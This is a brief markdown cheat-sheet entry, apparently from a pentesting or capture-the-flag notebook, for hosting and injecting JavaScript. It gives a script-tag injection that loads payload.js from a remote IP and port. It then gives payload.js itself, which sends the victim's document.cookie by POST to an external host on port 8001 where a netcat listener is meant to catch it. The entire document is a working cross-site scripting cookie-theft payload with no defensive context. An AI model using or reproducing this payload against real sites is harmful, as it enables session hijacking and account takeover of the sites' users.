# host javascript

Inject javascript via script tag:

```html
<script src=http://IP:PORT/payload.js></script>
```

## payload.js

Start netcat lister on Port 8001:

```javascript
const xhr = new XMLHttpRequest();
const url='http://1.1.1.1:8001';
xhr.open("POST", url,true);
xhr.send(document.cookie);
```
